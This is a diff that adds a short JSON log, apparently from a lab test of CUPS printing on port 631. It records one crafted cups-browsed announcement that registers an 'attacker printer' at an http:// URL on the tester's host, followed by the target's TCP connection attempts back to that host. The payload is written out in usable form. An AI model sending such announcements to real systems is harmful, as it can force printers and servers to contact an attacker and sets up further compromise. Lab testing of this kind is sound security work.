@@ -1,0 +1,22 @@
+[
+  {
+    "timestamp": "2026-11-09T13:54:32.971731",
+    "variation": 4,
+    "description": "Malformed URI scheme (http:// instead of ipp://)",
+    "src_ip": "172.18.0.1",
+    "src_port": 37863,
+    "dst_ip": "172.18.0.2",
+    "dst_port": 631,
+    "payload": "0 3 http://172.18.0.1:8631/printers/NAME \"Kali Lab\" \"AttackerPrinter-BadScheme\""
+  },
+  {
+    "timestamp": "2026-11-09T13:54:49.156687",
+    "event": "cups_tcp_callback",
+    "summary": "Ether / IP / TCP 172.18.0.2:58644 > 172.18.0.1:8631 S"
+  },
+  {
+    "timestamp": "2026-11-09T13:54:49.156939",
+    "event": "cups_tcp_callback",
+    "summary": "Ether / IP / TCP 172.18.0.2:58646 > 172.18.0.1:8631 S"
+  }
+]
